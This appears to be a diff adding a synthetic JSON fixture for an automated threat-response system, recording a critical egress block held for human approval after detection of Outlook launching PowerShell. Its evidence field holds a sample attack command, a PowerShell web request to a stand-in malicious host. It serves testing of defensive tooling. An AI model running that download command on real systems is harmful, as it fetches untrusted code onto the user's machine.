@@ -1,0 +1,114 @@
+{
+  "schema": "swarm.spine.envelope.v1",
+  "issuer": "swarm:ed25519:5fa33029f70d52222fb3e88ab19ad1158158a8da7db100288a4b341e69774622",
+  "seq": 6,
+  "prev_envelope_hash": "0x74dd74f7e62dee123e0244b6cccf8e1d81909dfe513ebbaa48a3394096941e02",
+  "issued_at": "2026-03-17T09:14:42Z",
+  "capability_token": null,
+  "fact": {
+    "schema": "ambush.perch.hold.v1",
+    "issuer": {
+      "swarm_agent_id": "swarm:ed25519:18085f16811dba240c5bf9ef0c0d0bc6f359e7812cdedf86e7519852307ce470",
+      "role": null,
+      "nostr_pubkey": null
+    },
+    "emitted_at_ms": 1773738882700,
+    "locator": {
+      "hold_id": "h_1c28ae79",
+      "case_channel": "27799e23-ab25-4659-b381-3de47ea7ca4d",
+      "hunt_id": "hunt-evt-2",
+      "finding_card_id": "2b1c9dceec6de43e267f3017cea73b7cc8f92696b9e0ffb71cad9add387f2536"
+    },
+    "hold": {
+      "hold_id": "h_1c28ae79",
+      "state": "notified",
+      "action_kind": "block_egress",
+      "severity": "CRITICAL",
+      "held_at_ms": 1773738882700,
+      "expires_at_ms": 1773742482700,
+      "action_request": {
+        "hunt_id": "hunt-evt-2",
+        "requested_by": "swarm:ed25519:18085f16811dba240c5bf9ef0c0d0bc6f359e7812cdedf86e7519852307ce470",
+        "action": {
+          "type": "block_egress",
+          "target": "198.51.100.20"
+        },
+        "severity": "CRITICAL",
+        "evidence": {
+          "source": "synthetic",
+          "parent_process": "OUTLOOK",
+          "process_name": "powershell",
+          "command_line": "powershell.exe Invoke-WebRequest https://evil.test",
+          "normalized_command_line": "powershell.exe invoke-webrequest https://evil.test",
+          "decoded_command_segments": [],
+          "command_line_transforms": [],
+          "user": "alice",
+          "host_id": "host-ops-1",
+          "heuristics": {
+            "encoded_flag": false,
+            "download_hint": true
+          }
+        }
+      },
+      "policy_decision": {
+        "verdict": "require_human",
+        "rule_name": "static.human_gate",
+        "reason": "authorized but held for human approval"
+      },
+      "rationale": {
+        "rule_name": "static.human_gate",
+        "reason": "authorized but held for human approval",
+        "threat_class": "execution",
+        "severity": "CRITICAL",
+        "request_carried_fields": [
+          "severity",
+          "threat_class"
+        ],
+        "concentration_at_hold": {
+          "threat_class": "execution",
+          "total_strength": 2.696884,
+          "distinct_sources": 2,
+          "peak_confidence": 0.9
+        },
+        "escalation_level": "alert",
+        "governance_receipt_present": false
+      },
+      "leases_a_containment": false,
+      "rehearsal": {
+        "rehearsal_id": "rehearsal:hunt-evt-2:block_egress:1773738882700",
+        "source_bundle_id": "replay:hellcat_office_demo:hunt-evt-2",
+        "prepared_at_ms": 1773738882700,
+        "simulated_only": true,
+        "blast_radius": {
+          "scope_kind": "network_target",
+          "scope_value": "198.51.100.20",
+          "impact": "network_egress_blocked",
+          "max_affected_scopes": 1,
+          "affected_capabilities": [
+            "network.egress"
+          ],
+          "summary": "egress to one address is blocked"
+        },
+        "rollback": {
+          "required": true,
+          "summary": "remove the network block",
+          "steps": [
+            {
+              "kind": "remove_network_block",
+              "summary": "withdraw the egress block for 198.51.100.20"
+            }
+          ]
+        }
+      },
+      "inverse_resolution": [
+        {
+          "step_kind": "remove_network_block",
+          "verdict": "unmapped",
+          "reason": "block_egress is not a containment action, so no ContainmentInverse is resolved for it"
+        }
+      ],
+      "decision": null
+    }
+  },
+  "envelope_hash": "0xb7b7c9b3d02d0599899c054d629aab5021d88728080bec7be426ffa53b542906"
+}
